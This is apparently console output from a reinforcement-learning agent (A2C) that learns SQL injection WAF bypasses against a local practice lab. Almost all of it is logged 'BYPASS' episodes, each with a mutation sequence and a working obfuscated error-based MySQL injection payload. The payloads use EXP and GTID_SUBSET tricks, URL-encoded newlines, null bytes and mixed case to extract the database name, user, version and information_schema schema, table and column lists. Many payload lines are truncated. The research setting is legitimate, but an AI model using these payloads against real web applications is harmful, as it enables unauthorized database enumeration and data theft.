/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 3
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.00
  [BYPASS] Ep 7471 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sEleCT%0a*%0aFrOm%0a(SElecT%0a(databAsE%a0()))a));%00
  [BYPASS] Ep 7477 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(selEct%0a*%0afRom%0a(SelecT%0a((SelecT%0aJSON_ARRAYAGG(schema_name)%0aFRoM%0aINFoRmAtIon_sCHeMa.schemata)))a));%00
  Ep 7480 | SR=20% | Steps=12.8 | R=-24.97
  [BYPASS] Ep 7482 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aand%0aEXP(~(SElect%0a*%0afrOm%0a(seleCT%0a((SELeCT%0aJSON_ARRAYAGG(schema_name)%0aFRom%0aiNFormaTION_Schema.schemata)))a));%00
  [BYPASS] Ep 7489 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sElECt%0a*%0aFrom%0a(SELeCt%0a(user%a0()))a));%00
  Ep 7490 | SR=20% | Steps=12.9 | R=-25.31
  [BYPASS] Ep 7491 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7495 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(sElect%0a*%0aFROm%0a(SElect%0a((selecT%0aJSON_ARRAYAGG(column_name)%0afRom%0aiNfoRMatIoN_SCHema.columns%0aWHERe%0atablE_schema=DATABA
  [BYPASS] Ep 7497 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sELect%0a*%0aFROm%0a(SeLEcT%0a(user%a0()))a));%00
  [BYPASS] Ep 7499 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aand%0aEXP(~(SELEct%0a*%0aFRoM%0a(SeLEct%0a((sELect%0aJSON_ARRAYAGG(schema_name)%0aFrOM%0aINForMAtIOn_sCHema.schemata)))a));%00
  Ep 7500 | SR=40% | Steps=10.7 | R=-18.22
  [BYPASS] Ep 7504 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(sELECT%0a*%0afROm%0a(SeLeCt%0a((sELECT%0aJSON_ARRAYAGG(tAbLe_name)%0afrOm%0ainfOrMatIoN_sChEmA.tAbLEs%0awHeRE%0ataBle_schema=DATaBASE
  [BYPASS] Ep 7507 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sELeCt%0a*%0afrOm%0a(sELEcT%0a((SElEcT%0aJSON_ARRAYAGG(column_name)%0afrOm%0aiNforMatIoN_ScHEMA.columns%0aWHere%0atABle_schema=DaTAbA
  Ep 7510 | SR=20% | Steps=13.0 | R=-25.07
  [BYPASS] Ep 7514 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(sElect%0a*%0afroM%0a(SELect%0a(DAtaBasE%a0()))a));%00
  [BYPASS] Ep 7516 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(sELeCt%0a*%0afrOm%0a(sElEct%0a(user%a0()))a));%00
  [BYPASS] Ep 7517 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(seLecT%0a*%0aFRom%0a(sELect%0a(user%a0()))a));%00
  [BYPASS] Ep 7519 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  Ep 7520 | SR=40% | Steps=10.8 | R=-17.10
  [BYPASS] Ep 7528 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SelECt%0a*%0aFROM%0a(seLecT%0a(user%a0()))a));%00
  Ep 7530 | SR=10% | Steps=14.0 | R=-26.45
  [BYPASS] Ep 7535 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(selECt%0a*%0afrom%0a(seLect%0a((SelecT%0aJSON_ARRAYAGG(column_name)%0aFROM%0aInformATion_Schema.columns%0awhERe%0atABle_schema=datAbA
  [BYPASS] Ep 7536 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 7540 | SR=20% | Steps=12.8 | R=-26.15
  [BYPASS] Ep 7541 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SelECt%0a*%0afROM%0a(sELecT%0a(DataBasE%a0()))a));%00
  [BYPASS] Ep 7547 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7549 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(sELECt%0a*%0aFRoM%0a(SelEcT%0a((SEleCt%0aJSON_ARRAYAGG(concat(tABLe_schema,CHAR(46),tAbLE_name))%0aFROM%0aInfOrMatioN_SCheMA.tabLes%0
  [BYPASS] Ep 7550 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SeLect%0a*%0aFROM%0a(sELECT%0a(version%a0()))a));%00
  Ep 7550 | SR=40% | Steps=10.9 | R=-18.67
  [BYPASS] Ep 7553 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sElECT%0a*%0afROM%0a(sElect%0a((SELect%0aJSON_ARRAYAGG(column_name)%0aFrom%0aInFOrMATION_scHEMa.columns%0awHERE%0atAblE_schema=DAtABA
  [BYPASS] Ep 7554 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(SELECt%0a*%0aFrOm%0a(sElEcT%0a((SeleCT%0aJSON_ARRAYAGG(schema_name)%0aFroM%0aINfOrMATIon_SCheMa.schemata)))a));%00
  [BYPASS] Ep 7555 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sELeCt%0a*%0afROm%0a(SElECt%0a(user%a0()))a));%00
  [BYPASS] Ep 7560 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(seleCT%0a*%0aFROM%0a(SeLEct%0a((seLecT%0aJSON_ARRAYAGG(schema_name)%0aFRom%0aInFOrmaTiOn_ScHema.schemata)))a));%00
  Ep 7560 | SR=40% | Steps=10.8 | R=-16.88
  [BYPASS] Ep 7564 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SeleCT%0a*%0aFROm%0a(SeLecT%0a(user%a0()))a));%00
  [BYPASS] Ep 7568 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(SELECt%0a*%0afROM%0a(SELeCt%0a(user%a0()))a));%00
  [BYPASS] Ep 7569 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SELEcT%0a*%0afRom%0a(seLEct%0a((selEct%0aJSON_ARRAYAGG(tabLE_name)%0aFrom%0aINFormATIon_SCHemA.tAbles%0aWhERe%0ataBLE_schema=DAtABaSE
  Ep 7570 | SR=30% | Steps=12.0 | R=-21.73
  [BYPASS] Ep 7572 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SELEct%0a*%0afRoM%0a(sEleCt%0a(version%a0()))a));%00
  [BYPASS] Ep 7577 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnd%0aEXP(~(SeLECT%0a*%0afRoM%0a(SelECT%0a((sELecT%0aJSON_ARRAYAGG(cOncAT(taBLe_schema,CHAR(46),Table_name))%0afROm%0aINForMatioN_sCHemA.TabLes%0
  Ep 7580 | SR=20% | Steps=13.1 | R=-22.16
  [BYPASS] Ep 7581 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aand%0aEXP(~(SELeCt%0a*%0afroM%0a(SeLect%0a((SELeCT%0aJSON_ARRAYAGG(cOncAt(TABle_schema,CHAR(46),Table_name))%0aFrOM%0ainfORMatioN_sCHeMA.TAbLes%0
  [BYPASS] Ep 7582 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SeLECt%0a*%0aFROm%0a(SEleCt%0a((sEleCt%0aJSON_ARRAYAGG(tABLe_name)%0afRom%0aiNFORmATiON_SChEma.TAblEs%0awHeRe%0aTABle_schema=dataBASe
  [BYPASS] Ep 7583 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SeLect%0a*%0aFRom%0a(SelecT%0a(version%a0()))a));%00
  [BYPASS] Ep 7584 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SElect%0a*%0aFRom%0a(SelEcT%0a(dATabASe%a0()))a));%00
  [BYPASS] Ep 7587 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7588 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SElect%0a*%0afroM%0a(SElect%0a((SElEct%0aJSON_ARRAYAGG(column_name)%0afROM%0aiNfoRMATION_sCHeMa.columns%0awHeRe%0aTABLE_schema=dATaBa
  Ep 7590 | SR=60% | Steps=8.9 | R=-8.92
  [BYPASS] Ep 7592 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7595 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SELECt%0a*%0afroM%0a(sELECt%0a(DATaBaSe%a0()))a));%00
  [BYPASS] Ep 7596 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(SelecT%0a*%0afRoM%0a(SELEcT%0a((SElect%0aJSON_ARRAYAGG(cONCAt(TABLe_schema,CHAR(46),TabLe_name))%0afRoM%0aiNFORmATioN_SCheMa.taBles%0
  [BYPASS] Ep 7598 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sElECt%0a*%0afrom%0a(SeleCt%0a(version%a0()))a));%00
  Ep 7600 | SR=40% | Steps=10.9 | R=-17.05
  [BYPASS] Ep 7603 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 7610 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SeLEcT%0a*%0afrOm%0a(sElECt%0a(user%a0()))a));%00
  Ep 7610 | SR=20% | Steps=12.8 | R=-22.41
  [BYPASS] Ep 7615 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 7620 | SR=10% | Steps=13.8 | R=-28.64
  [BYPASS] Ep 7624 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SELecT%0a*%0aFroM%0a(sElECT%0a(user%a0()))a));%00
  Ep 7630 | SR=10% | Steps=14.0 | R=-28.97
  [BYPASS] Ep 7639 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(SElEct%0a*%0aFRoM%0a(sElEcT%0a((SElect%0aJSON_ARRAYAGG(cONCAt(TabLE_schema,CHAR(46),tAble_name))%0afroM%0aInForMaTion_SCHEMa.TAbLes%0
  Ep 7640 | SR=10% | Steps=14.1 | R=-29.26
  [BYPASS] Ep 7643 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 7648 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 7650 | SR=20% | Steps=12.6 | R=-23.04
  [BYPASS] Ep 7651 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(sElect%0a*%0aFrOM%0a(selECt%0a((seLEcT%0aJSON_ARRAYAGG(column_name)%0aFRoM%0aINForMATIon_SchEma.columns%0aWHERe%0aTabLE_schema=DatAbA
  [BYPASS] Ep 7654 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(selECT%0a*%0aFRom%0a(SElecT%0a(daTabAse%a0()))a));%00
  [BYPASS] Ep 7656 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(seleCt%0a*%0afRoM%0a(SeLEcT%0a((SELECt%0aCoNcAT(CHAR(124),JSON_ARRAYAGG(tAbLe_name),CHAR(124))%0aFrOm%0aiNFORmaTiON_sCHemA.tabLEs%0aW
  [BYPASS] Ep 7657 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 7660 | SR=40% | Steps=11.0 | R=-13.93
  [BYPASS] Ep 7663 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(seLECt%0a*%0aFrom%0a(seLeCt%0a((SelECT%0aJSON_ARRAYAGG(column_name)%0afrOm%0aInForMatIOn_SchemA.columns%0awHeRe%0aTaBle_schema=DAtaBA
  [BYPASS] Ep 7666 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7668 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aand%0aEXP(~(SElect%0a*%0aFROM%0a(SelEcT%0a((sELECt%0aJSON_ARRAYAGG(schema_name)%0aFRom%0aINfoRmaTiON_sCHeMA.schemata)))a));%00
  [BYPASS] Ep 7669 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(sElEcT%0a*%0aFROm%0a(SelEct%0a((SElECT%0aJSON_ARRAYAGG(column_name)%0aFROm%0aINfOrmAtIOn_scHEMA.columns%0aWhere%0aTaBle_schema=DataBA
  Ep 7670 | SR=40% | Steps=10.7 | R=-13.55
  [BYPASS] Ep 7671 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(seleCt%0a*%0aFROM%0a(seLECT%0a((SeLEcT%0aJSON_ARRAYAGG(schema_name)%0afRoM%0aInfoRmAtION_sCHEma.schemata)))a));%00
  [BYPASS] Ep 7674 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(seLECT%0a*%0afrOM%0a(sElECT%0a(dAtAbAsE%a0()))a));%00
  [BYPASS] Ep 7679 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(seleCt%0a*%0aFrom%0a(SeleCT%0a((sElect%0aJSON_ARRAYAGG(ConcAT(taBLe_schema,CHAR(46),TaBlE_name))%0afrOM%0aINfOrmaTIon_sCHeMa.taBLEs%0
  Ep 7680 | SR=30% | Steps=11.9 | R=-19.43
  [BYPASS] Ep 7682 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aand%0aEXP(~(SElECT%0a*%0aFrom%0a(seLecT%0a((SelEct%0aJSON_ARRAYAGG(cOncAt(tABLe_schema,CHAR(46),TaBlE_name))%0afroM%0aInfoRmaTiOn_ScHema.TaBlEs%0
  [BYPASS] Ep 7684 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aand%0aEXP(~(SelECT%0a*%0aFroM%0a(SeleCT%0a((sElECT%0aJSON_ARRAYAGG(schema_name)%0afroM%0aiNforMaTION_SChEmA.schemata)))a));%00
  [BYPASS] Ep 7687 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 7690 | SR=30% | Steps=11.8 | R=-20.41
  [BYPASS] Ep 7691 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7694 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SeLECT%0a*%0afrOm%0a(sELECT%0a(version%a0()))a));%00
  Ep 7700 | SR=20% | Steps=12.9 | R=-25.22
  [BYPASS] Ep 7703 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 7707 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(sEleCt%0a*%0aFrOM%0a(SELeCt%0a((seLECT%0aJSON_ARRAYAGG(tABle_name)%0afROM%0aiNfOrMAtioN_schema.TABlEs%0awHere%0aTAblE_schema=DaTaBasE
  [BYPASS] Ep 7709 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7710 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(sElECT%0a*%0afRoM%0a(SELect%0a(user%a0()))a));%00
  Ep 7710 | SR=40% | Steps=10.6 | R=-16.06
  [BYPASS] Ep 7715 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(sElECt%0a*%0aFrOM%0a(SeLect%0a((SEleCT%0aJSON_ARRAYAGG(column_name)%0aFroM%0aINFoRMATion_scHeMa.columns%0awHere%0atAblE_schema=databA
  [BYPASS] Ep 7717 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(selEct%0a*%0aFROm%0a(seLect%0a(user%a0()))a));%00
  Ep 7720 | SR=20% | Steps=13.0 | R=-22.47
  [BYPASS] Ep 7721 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7723 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(selECt%0a*%0aFrom%0a(SelEcT%0a(daTAbaSe%a0()))a));%00
  [BYPASS] Ep 7725 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SELeCT%0a*%0aFrOm%0a(sELeCT%0a(databasE%a0()))a));%00
  Ep 7730 | SR=30% | Steps=11.8 | R=-21.19
  [BYPASS] Ep 7733 | steps=7 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAnd%0aEXP(~(SElEct%0a*%0aFROM%0a(seLEct%0a((sELecT%0aConcaT(CHAR(124),JSON_ARRAYAGG(TabLe_name),CHAR(124))%0afRoM%0ainfORMaTiOn_ScHEmA.TaBles%0aw
  [BYPASS] Ep 7734 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7735 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(seLEcT%0a*%0afRom%0a(sElECt%0a(DAtABase%a0()))a));%00
  [BYPASS] Ep 7738 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aand%0aEXP(~(SElEct%0a*%0afRom%0a(sELecT%0a((selecT%0aJSON_ARRAYAGG(CoNCAt(taBLe_schema,CHAR(46),taBle_name))%0aFRom%0ainForMATioN_scHEmA.tABlEs%0
  [BYPASS] Ep 7740 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aANd%0aEXP(~(sElECt%0a*%0afrOM%0a(seLeCt%0a((seLecT%0aJSON_ARRAYAGG(schema_name)%0afrOM%0aInForMAtion_SCHEmA.schemata)))a));%00
  Ep 7740 | SR=50% | Steps=10.0 | R=-14.53
  [BYPASS] Ep 7741 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7743 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(SEleCT%0a*%0afRom%0a(SELecT%0a((seLECt%0aJSON_ARRAYAGG(cOncAT(table_schema,CHAR(46),TaBLe_name))%0aFROm%0aInfORMatiON_scHEmA.TaBlEs%0
  [BYPASS] Ep 7744 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(seLEcT%0a*%0aFrom%0a(sElEcT%0a(version%a0()))a));%00
  [BYPASS] Ep 7747 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7750 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aand%0aEXP(~(SelEct%0a*%0afrOm%0a(selECt%0a((seLEcT%0aJSON_ARRAYAGG(ConCat(TABLe_schema,CHAR(46),tAble_name))%0afrOM%0aInfORMatIoN_scHEMA.tAblEs%0
  Ep 7750 | SR=50% | Steps=9.8 | R=-14.37
  [BYPASS] Ep 7752 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 7755 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(seleCT%0a*%0aFrOm%0a(SelECt%0a(user%a0()))a));%00
  [BYPASS] Ep 7756 | steps=4 | seq=agg_swap -> case -> null_byte -> newline
           payload: 1'%0aaND%0aEXP(~(SeleCT%0a*%0aFROm%0a(SELect%0a((seLEct%0aJSON_ARRAYAGG(schema_name)%0aFROM%0aInFOrMatIOn_sCHEmA.schemata)))a));%00
  [BYPASS] Ep 7759 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7760 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SelEct%0a*%0aFrOM%0a(SeLEct%0a(version%a0()))a));%00
  Ep 7760 | SR=50% | Steps=9.5 | R=-14.20
  [BYPASS] Ep 7764 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 7770 | SR=10% | Steps=13.8 | R=-27.49
  [BYPASS] Ep 7771 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAnD%0aEXP(~(sELEcT%0a*%0afrOm%0a(SEleCT%0a((selEcT%0aJSON_ARRAYAGG(cONcAt(TAblE_schema,CHAR(46),tabLE_name))%0afrOM%0ainfoRmATIOn_schEMA.tABLEs%0
  [BYPASS] Ep 7774 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aanD%0aEXP(~(SELeCt%0a*%0aFrOM%0a(SElecT%0a((sElEct%0aJSON_ARRAYAGG(column_name)%0aFRoM%0aiNfOrMATIon_scHEmA.columns%0awHerE%0atabLE_schema=DATabA
  [BYPASS] Ep 7776 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7778 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(sElecT%0a*%0afrOm%0a(sElEct%0a(version%a0()))a));%00
  [BYPASS] Ep 7779 | steps=6 | seq=case -> hex_to_char -> agg_swap -> case -> null_byte -> newline
           payload: 1'%0aAND%0aEXP(~(seLeCt%0a*%0afrOM%0a(SeLEct%0a((SElECT%0aJSON_ARRAYAGG(ConCat(taBle_schema,CHAR(46),TAble_name))%0afroM%0aInforMatioN_schema.TablEs%0
  Ep 7780 | SR=50% | Steps=10.0 | R=-13.08
  [BYPASS] Ep 7784 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aEXP(~(SeLECt%0a*%0afROM%0a(SeLECt%0a((sELect%0aJSON_ARRAYAGG(TAbLe_name)%0afrom%0ainFORMaTIOn_scHEMA.tABLes%0awhErE%0aTABlE_schema=DAtAbase
  [BYPASS] Ep 7785 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 7786 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aand%0aEXP(~(SeLeCT%0a*%0aFRom%0a(SElecT%0a((sELEct%0aJSON_ARRAYAGG(column_name)%0aFROm%0aInFOrmatION_sCHEmA.columns%0aWHere%0aTABlE_schema=DaTaba
  Ep 7790 | SR=30% | Steps=11.8 | R=-21.05
  [BYPASS] Ep 7792 | steps=5 | seq=agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
